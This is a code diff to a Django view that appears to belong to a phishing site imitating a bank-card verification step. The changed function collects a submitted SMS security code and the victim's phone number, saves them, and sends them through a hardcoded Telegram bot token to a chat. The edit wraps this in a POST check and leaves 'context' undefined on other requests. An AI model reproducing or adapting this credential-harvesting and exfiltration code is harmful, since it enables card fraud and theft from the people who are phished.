@@ -379,20 +379,23 @@ def rabite(request):
     return render( request,'pages/rabite.html' )
 
 def dsecazericard(request):
-    sms = request.POST.get('secpass')
     contact_id = request.session.get('contact_id')
     contact = ContactModel.objects.get(id=contact_id)
-    contact.sms=sms
-    contact.save()
-    context = {
-        'last_contact_id': contact.id,
-        "display":contact.hidden_type
+    if request.method == "POST":
+        sms = request.POST.get('secpass')
+        contact_id = request.session.get('contact_id')
+        contact = ContactModel.objects.get(id=contact_id)
+        contact.sms=sms
+        contact.save()
+        context = {
+            'last_contact_id': contact.id,
+            "display":contact.hidden_type
 
-    }
-    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}')
+        }
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}')
 
+        return render( request,'pages/loading.html',context )
     return render( request,'pages/loading.html',context )
-
 def page_not_found(request, exception):
     return render(request, 'pages/404.html', status=404)
 
